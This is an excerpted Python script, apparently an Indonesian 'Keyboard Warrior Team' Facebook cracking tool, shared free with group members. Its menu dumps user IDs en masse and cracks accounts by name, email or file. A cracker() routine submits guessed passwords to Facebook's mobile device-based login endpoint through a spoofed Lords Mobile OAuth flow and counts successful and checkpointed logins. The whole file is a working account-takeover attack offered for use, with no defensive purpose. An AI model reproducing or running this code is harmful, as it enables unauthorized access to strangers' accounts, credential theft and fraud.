...
\t  |  __'.[ `/'`\]`'_\ : [_   ] [_   ]/ /__\\[ `/'`\] 
\t _| |__) || |    // | |, .' /_  .' /_| \__., | |     	
\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]   \nSCRIPT:SOURCE KODE ALVINO ADIDJAYA\nDIUPDATE OLEH TEAM KR: \n1.KHANZA[Sholeh ]\n2.AGAM\n3.NIAMMI \n4.BAYU \n5.IYAN LUMINE\n
...
def menu(NAME,ID):
	...
	print(f' Your Ip  : {ip}')
	print(f' Script  : free untuk semua angota KR')
	print(f'')
	...
	print('')
	khanza_keyboardwarrior = input('└─ Pilih : ')
	if khanza_keyboardwarrior in ['1']:
		dump_massal()
	elif khanza_keyboardwarrior in ['2']:
		result()
	elif khanza_keyboardwarrior in ['3']:
		file_cp()
	elif khanza_keyboardwarrior in ['4']:
		crack_nama()
	elif khanza_keyboardwarrior in ['5']:
		crack_email()
	elif khanza_keyboardwarrior in ['6']:
		crack_file()
	elif khanza_keyboardwarrior in ['7']:
		dump_id()
	elif khanza_keyboardwarrior in ['bot','Bot','BOT']:
		bot()
	elif khanza_keyboardwarrior in ['0']:
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	print('='*51)
	print('1. Mobile [mobile update igg] ') 
	print('2. Beta  ')
	print('3. Mtouch ')
	print('4. D. facebook [methode update]')
	print('='*51)
	hc = input('└─ Pilih : ')
	if hc in ['1','01']:
...
def cracker(idf,pwv):
	...
	sys.stdout.write(f"\rKEYBOARD WARRIOR TEAM  {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
			...
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=165299770186555&auth_token=4d9d407cd51a0b1afa345421c57b4c80&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D165299770186555%26cbt%3D1682728670264%26e2e%3D%257B%2522init%2522%253A1682728670264%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Df00ca9eb-2ae3-4a98-a05e-dc43c96327bd%26scope%3Dopenid%252Cemail%252Cpublic_profile%2B%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25222271ba4e-3b1d-42e1-b669-a2af7df71cdc%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522qc7v03jjfoidiv5je881%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.igg.android.lordsmobile%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3Db7r2oiEHs3fgHvTSc_5rI14HH2x6xJ16FdNFcIrLGhA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2271ba4e-3b1d-42e1-b669-a2af7df71cdc%26tp%3Dunspecified&refsrc=deprecated&app_id=165299770186555&cancel=fbconnect%3A%2F%2Fcct.com.igg.android.lordsmobile%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25222271ba4e-3b1d-42e1-b669-a2af7df71cdc%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522qc7v03jjfoidiv5je881%2522%257D&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
